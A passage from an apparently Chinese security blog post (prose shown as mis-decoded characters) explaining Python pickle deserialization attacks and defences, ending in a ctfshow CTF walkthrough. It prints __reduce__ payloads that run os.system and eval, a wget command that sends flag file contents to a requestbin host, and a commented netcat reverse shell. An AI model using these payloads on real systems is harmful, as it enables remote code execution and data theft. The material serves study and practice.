top</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b&#x27;\x96&#x27;</span>  <span class="comment"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b&#x27;\x97&#x27;</span>  <span class="comment"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b&#x27;\x98&#x27;</span>  <span class="comment"># make top of stack readonly</span></span><br></pre></td></tr></table></figure><p>ä¸Šæ–‡è°ˆåˆ°äº†<code>opcode</code>æ˜¯æœ‰å¤šä¸ªç‰ˆæœ¬çš„, åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶å¯ä»¥é€šè¿‡<code>protocol=num</code>æ¥é€‰æ‹©<code>opcode</code>çš„ç‰ˆæœ¬, æŒ‡å®šçš„ç‰ˆæœ¬å¿…é¡»å°äºç­‰äº<code>5</code>.</p><h4 id="æ¼æ´å‡ºç°ä½ç½®"><a href="#æ¼æ´å‡ºç°ä½ç½®" class="headerlink" title="æ¼æ´å‡ºç°ä½ç½®"></a>æ¼æ´å‡ºç°ä½ç½®</h4><ol><li>é€šå¸¸åœ¨è§£æè®¤è¯token/sessionçš„æ—¶å€™, ç°åœ¨å¾ˆå¤šwebæœåŠ¡éƒ½åœ¨ä½¿ç”¨<code>redis</code>/<code>mongodb</code>/<code>memcached</code>ç­‰æ¥å­˜å‚¨sessionç­‰çŠ¶æ€ä¿¡æ¯</li><li>å¯èƒ½å°†å¯¹è±¡<code>pickle</code>åå­˜å‚¨æˆç£ç›˜æ–‡ä»¶</li><li>å¯èƒ½å°†å¯¹è±¡<code>pickle</code>ååœ¨ç½‘ç»œä¸­ä¼ è¾“</li></ol><blockquote><p>å…¶å®ï¼Œæœ€å¸¸è§çš„ä¹Ÿæ˜¯æœ€ç»å…¸çš„ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ç‚¹ï¼Œä¹Ÿå°±æ˜¯ flask é…åˆ redis åœ¨æœåŠ¡ç«¯å­˜å‚¨ session çš„æƒ…æ™¯ï¼Œè¿™é‡Œçš„ session æ˜¯è¢« pickle åºåˆ—åŒ–è¿›è¡Œå­˜å‚¨çš„ï¼Œå¦‚æœä½ é€šè¿‡ cookie è¿›è¡Œè¯·æ±‚ sessionid çš„è¯ï¼Œsession ä¸­çš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œçœ‹ä¼¼å¥½åƒæ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜,å› ä¸º session æ˜¯å­˜å‚¨åœ¨ æœåŠ¡ç«¯çš„ï¼Œä½†æ˜¯ç»ˆç©¶æ˜¯æŠµä¸ä½ redis çš„æœªæˆæƒè®¿é—®ï¼Œå¦‚æœå‡ºç°æœªæˆæƒçš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡ set è®¾ç½®è‡ªå·±çš„ session ,ç„¶åé€šè¿‡è®¾ç½® cookie å»è¯·æ±‚ session çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬è‡ªå®šçš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œç„¶åæˆ‘ä»¬å°±è¾¾åˆ°äº†æ‰§è¡Œä»»æ„å‘½ä»¤æˆ–è€…ä»»æ„ä»£ç çš„ç›®çš„</p></blockquote><h4 id="æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="æ¼æ´åˆ©ç”¨æ–¹å¼"></a>æ¼æ´åˆ©ç”¨æ–¹å¼</h4><p>æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–, ååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<code>__reduce__()</code>å‡½æ•°ä»è€Œè§¦çŠ¯æ¶æ„ä»£ç </p><p>ç®€å•æ¥è¯´, <code>__reduce__()</code>é­”æœ¯æ–¹æ³•ç±»ä¼¼äºphpä¸­çš„<code>__wakeup()</code>æ–¹æ³•, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨<code>__reduce__()</code>é­”æœ¯æ–¹æ³•</p><ol><li>å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸², é‚£ä¹ˆå°†ä¼šå»å½“å‰ä½œç”¨åŸŸä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²å€¼å¯¹åº”åå­—çš„å¯¹è±¡, å°†å…¶ååºåˆ—åŒ–åè¿”å›</li><li>å¦‚æœè¿”å›çš„æ˜¯ä¸€ä¸ªå…ƒç»„, è¦æ±‚æ˜¯2-6ä¸ªå‚æ•°(python3.8æ–°åŠ å…¥å…ƒç»„çš„ç¬¬å…­é¡¹)<ol><li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯è°ƒç”¨çš„å¯¹è±¡.</li><li>ç¬¬äºŒä¸ªæ˜¯è¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„, å¦‚æœå¯è°ƒç”¨å¯¹è±¡ä¸æ¥å—å‚æ•°åˆ™å¿…é¡»æä¾›ä¸€ä¸ªç©ºå…ƒç»„.</li><li>ç¬¬ä¸‰ä¸ªæ˜¯ç”¨äºè¡¨ç¤ºå¯¹è±¡çš„çŠ¶æ€çš„å¯é€‰å…ƒç´ , å°†è¢«ä¼ ç»™å‰è¿°çš„<code>__setstate__()</code>æ–¹æ³•, å¦‚æœå¯¹è±¡æ²¡æœ‰æ­¤æ–¹æ³•, åˆ™è¿™ä¸ªå…ƒç´ å¿…é¡»æ˜¯å­—å…¸ç±»å‹å¹¶ä¼šè¢«æ·»åŠ è‡³<code>__dict__</code>å±æ€§ä¸­.</li><li>ç¬¬å››ä¸ªæ˜¯ç”¨äºè¿”å›è¿ç»­é¡¹çš„è¿­ä»£å™¨çš„å¯é€‰å…ƒç´ .</li><li>ç¬¬äº”ä¸ªæ˜¯ç”¨äºè¿”å›è¿ç»­é”®å€¼å¯¹çš„è¿­ä»£å™¨çš„å¯é€‰å…ƒç´ .</li><li>ç¬¬å…­ä¸ªæ˜¯ä¸€ä¸ªå¸¦æœ‰<code>(obj, state)</code>ç­¾åçš„å¯è°ƒç”¨å¯¹è±¡çš„å¯é€‰å…ƒç´ .</li></ol></li></ol><h4 id="åŸºæœ¬payload"><a href="#åŸºæœ¬payload" class="headerlink" title="åŸºæœ¬payload"></a>åŸºæœ¬payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230422222050050.png" alt="image-20230422222050050"></p><h4 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h4><ul><li>é‡‡ç”¨ç”¨æ›´é«˜çº§çš„æ¥å£<code>__getnewargs()</code>ã€<code>__getstate__()</code>ã€<code>__setstate__()</code>ç­‰ä»£æ›¿<code>__reduce__()</code>é­”æœ¯æ–¹æ³•</li><li>è¿›è¡Œååºåˆ—åŒ–æ“ä½œä¹‹å‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤, è‹¥é‡‡ç”¨çš„æ˜¯<code>pickle</code>åº“å¯é‡‡ç”¨è£…é¥°å™¨å®ç°</li><li>åœ¨ä¼ é€’åºåˆ—åŒ–å¯¹è±¡å‰è¯·è¿›è¡Œç­¾åæˆ–è€…åŠ å¯†ï¼Œé˜²æ­¢ç¯¡æ”¹å’Œé‡æ’­</li><li>å¦‚æœåºåˆ—åŒ–æ•°æ®å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œè¯·ç¡®ä¿ä¸å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ä¸èƒ½ä¿®æ”¹ã€è¦†ç›–æˆ–è€…é‡æ–°åˆ›å»ºè‡ªå·±çš„åºåˆ—åŒ–æ•°æ®</li><li>ä¸è¦å†ä¸å®ˆä¿¡ä»»çš„é€šé“ä¸­ä¼ é€’ pcikle åºåˆ—åŒ–å¯¹è±¡</li><li>å°† pickle åŠ è½½çš„æ•°æ®åˆ—å…¥ç™½åå•</li></ul><h3 id="åšä¿©é¢˜"><a href="#åšä¿©é¢˜" class="headerlink" title="åšä¿©é¢˜"></a>åšä¿©é¢˜</h3><p>è¿™é‡Œå¼€ä¸ªctfshowçš„web277å’Œweb278åšä¸€åš</p><p>æºç ä¸­å¯ä»¥çœ‹åˆ°hint<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230423194531848.png" alt="image-20230423194531848"></p><p>ç„¶åè¿™é‡Œæˆ‘ä»¬å°è¯•æ„é€ ä¸€ä¸‹payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">payload = pickle.dumps(demo)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230423195323229.png" alt="image-20230423195323229"></p><p>å¹¶æ²¡æœ‰æ‰“é€š, å°è¯•dnså¤–å¸¦ä¹Ÿä¸è¡Œ, è¿™é‡Œçœ‹ç½‘ä¸Šå¤§ä½¬æä¾›äº†ä¸€ç§ RequestBinæ–¹æ³•, è¿™é‡Œå€Ÿç”¨buuçš„<a class="link" target="_blank" rel="noopener" href="http://http.requestbin.buuoj.cn/">requestbinå¹³å°<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#shell = &#x27;wget `id|base64`.wjqfgx.dnslog.cn&#x27;</span></span><br><span class="line">        shell = <span class="string">&#x27;wget http://http.requestbin.buuoj.cn/1h6hdxc1?c=`cat fla*`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">payload = pickle.dumps(demo)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>é¢â€¦è¿™é‡Œæˆ‘ä¹Ÿæ²¡å¸¦å‡ºæ¥</p><p>é‚£ä¹ˆè¿™äºŒè€…æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢, è™½ç„¶ç»“æœæ˜¯éƒ½æ²¡å¸¦å‡ºæ¥</p><blockquote><p>RequestBinå’ŒDNSLogéƒ½æ˜¯ç”¨äºæµ‹è¯•å’Œè°ƒè¯•ç½‘ç»œåº”ç”¨ç¨‹åºçš„å·¥å…·ï¼Œä½†å®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨äºå®ƒä»¬æ‰€è®°å½•çš„ä¿¡æ¯ç±»å‹ã€‚</p><p>RequestBinå¤–å¸¦æ˜¯ä¸€ç§HTTPè¯·æ±‚æ•è·å·¥å…·ï¼Œå¯ä»¥æ•è·æ¥è‡ªä»»ä½•æ¥æºçš„HTTPè¯·æ±‚ï¼Œå¹¶ä¸ºæ‚¨æä¾›ä¸€ä¸ªä¸´æ—¶ç½‘å€ï¼Œåœ¨è¿™ä¸ªç½‘å€ä¸Šï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯·æ±‚å¤´ã€è¯·æ±‚å‚æ•°ç­‰ã€‚RequestBinå¤–å¸¦é€šå¸¸ç”¨äºæµ‹è¯•Webhookä»¥åŠä¸ç¬¬ä¸‰æ–¹APIçš„äº¤äº’ç­‰ã€‚</p><p>DNSLogå¤–å¸¦åˆ™æ˜¯ä¸€ç§ç”¨äºæ•è·DNSè¯·æ±‚çš„å·¥å…·ï¼Œå®ƒå¯ä»¥æ•è·é€šè¿‡æ‚¨æŒ‡å®šçš„DNSæœåŠ¡å™¨å‘é€çš„æ‰€æœ‰DNSè¯·æ±‚ï¼Œå¹¶å°†å…¶è®°å½•ä¸‹æ¥ã€‚DNSLogå¤–å¸¦é€šå¸¸ç”¨äºå‘ç°æ¶æ„è½¯ä»¶å’Œç½‘ç»œæ”»å‡»ï¼Œä¾‹å¦‚åŸŸååŠ«æŒã€DNSæŠ•æ¯’ç­‰æƒ…å†µã€‚</p><p>RequestBiné€‚ç”¨äºæ£€æŸ¥HTTPè¯·æ±‚ï¼Œè€ŒDNSLogé€‚ç”¨äºæ£€æŸ¥æ‰€æœ‰ç±»å‹çš„ç½‘ç»œè¯·æ±‚ã€‚RequestBinéœ€è¦å‘å¤–éƒ¨æœåŠ¡å™¨å‘é€è¯·æ±‚æ¥è·å–è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼Œè€ŒDNSLogåˆ™ä¸éœ€è¦è¿æ¥åˆ°å¤–éƒ¨æœåŠ¡å™¨å³å¯æ•è·ç½‘ç»œè¯·æ±‚ã€‚</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬ä¸‰ç§æ–¹æ³•, åå¼¹shellä¹Ÿå¤±è´¥, é‚£ä¹ˆå°±å¯èƒ½æ˜¯æˆ‘ä»¬payloadçš„é—®é¢˜äº†, æœ‰å¯èƒ½æ˜¯æ²¡æœ‰systemæ¨¡å—, è¿™é‡Œæˆ‘ä»¬æ¢ä¸€ä¸ªpayload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;wget http://http.requestbin.buuoj.cn/1h6hdxc1?c=`cat fla*`&#x27;).read()&quot;</span>,))</span><br><span class="line">        <span class="comment">#return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc ip port -e /bin/sh&#x27;).read()&quot;,))</span></span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">ctf = pickle.dumps(demo)</span><br><span class="line"><span class="comment">#df = pickle.loads(demo)</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ctf))</span><br></pre></td></tr></table></figure><p>è¯•äº†å‡ æ¬¡ä¸èƒ½ç”¨bash,æœ€åç”¨äº†/bin/sh,å› ä¸ºç¯å¢ƒé‡Œé¢æ²¡æœ‰è£…bash,å¾—ä¸åˆ°å“åº”ncè¿ä¸Šå°±ä¼šè‡ªåŠ¨æ–­å¼€</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230423204754659.png" alt="image-20230423204754659"></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230423204813979.png" alt="image-20230423204813979"></p></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/Study/">#Study</a>&nbsp;</li><li class="tag-item"><a href="/tags/Python/">#Python</a>&nbsp;</li><li class="tag-item"><a href="/tags/SSTI/">#SSTI</a>&nbsp;</li><li class="tag-item"><a href="/tags/Flask/">#Flask</a>&nbsp;</li><li class="tag-item"><a href="/tags/pickle/">#pickle</a>&nbsp;</li><li class="tag-item"><a href="/tags/py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#pyååºåˆ—åŒ–</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2023/04/25/AWD/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">Web_ç•ªå¤–ç¯‡_AWDèŠå£«</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2023/03/24/web_9_PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="title flex-center"><span class="post-nav-title-item">Web_9_PHPä»£ç å®¡è®¡</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"><script src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">Flaskå­¦ä¹ </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask-PIN%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="nav-number">2.</span> <span class="nav-text">Flask PINç è®¡ç®—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EFlask%E4%B8%8B%E7%9A%84SSTI"><span class="nav-number">3.</span> <span class="nav-text">åŸºäºFlaskä¸‹çš„SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="nav-number">3.1.</span> <span class="nav-text">pythoné­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#class"><span class="nav-number">3.1.1.</span> <span class="nav-text">class</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#base"><span class="nav-number">3.1.2.</span> <span class="nav-text">base</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mro"><span class="nav-number">3.1.3.</span> <span class="nav-text">mro</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#subclasses"><span class="nav-number">3.1.4.</span> <span class="nav-text">subclasses()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%90%8D%E7%A7%B0%E5%8F%AF%E6%8E%A7"><span class="nav-number">3.2.</span> <span class="nav-text">æ¨¡æ¿åç§°å¯æ§</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%86%85%E5%AE%B9%E5%8F%AF%E6%8E%A7"><span class="nav-number">3.3.</span> <span class="nav-text">æ¨¡æ¿å†…å®¹å¯æ§</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">3.3.1.</span> <span class="nav-text">åšé¢˜æ€è·¯</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flask%E7%9A%84ssti%E7%9A%84%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-number">3.4.</span> <span class="nav-text">flaskçš„sstiçš„è¿‡æ»¤ä¸ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4"><span class="nav-number">3.4.1.</span> <span class="nav-text">ç»•è¿‡.è¿‡æ»¤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-1"><span class="nav-number">3.4.2.</span> <span class="nav-text">ç»•è¿‡_è¿‡æ»¤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-2"><span class="nav-number">3.4.3.</span> <span class="nav-text">ç»•è¿‡[]è¿‡æ»¤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-3"><span class="nav-number">3.4.4.</span> <span class="nav-text">ç»•è¿‡\{\{è¿‡æ»¤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%8D%95-%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-number">3.4.5.</span> <span class="nav-text">ç»•è¿‡å•&#x2F;åŒå¼•å·è¿‡æ»¤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="nav-number">3.4.6.</span> <span class="nav-text">ç»•è¿‡æ•°å­—è¿‡æ»¤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">3.4.7.</span> <span class="nav-text">ç»•è¿‡å…³é”®å­—</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI-payload"><span class="nav-number">4.</span> <span class="nav-text">SSTI_payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">pythonååºåˆ—åŒ–</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">5.1.</span> <span class="nav-text">ç®€ä»‹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%AE%9E%E7%94%A8"><span class="nav-number">5.2.</span> <span class="nav-text">ç®€å•å®ç”¨</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PVM"><span class="nav-number">5.3.</span> <span class="nav-text">PVM</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%84%E6%88%90%E9%83%A8%E5%88%86"><span class="nav-number">5.3.1.</span> <span class="nav-text">ç»„æˆéƒ¨åˆ†</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-number">5.3.2.</span> <span class="nav-text">æ‰§è¡Œæµç¨‹</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="nav-number">5.3.3.</span> <span class="nav-text">æŒ‡ä»¤é›†</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BA%E7%8E%B0%E4%BD%8D%E7%BD%AE"><span class="nav-number">5.4.</span> <span class="nav-text">æ¼æ´å‡ºç°ä½ç½®</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">5.5.</span> <span class="nav-text">æ¼æ´åˆ©ç”¨æ–¹å¼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACpayload"><span class="nav-number">5.6.</span> <span class="nav-text">åŸºæœ¬payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-number">5.7.</span> <span class="nav-text">é˜²å¾¡æ–¹æ³•</span></a></li></ol></li><li class="nav-item 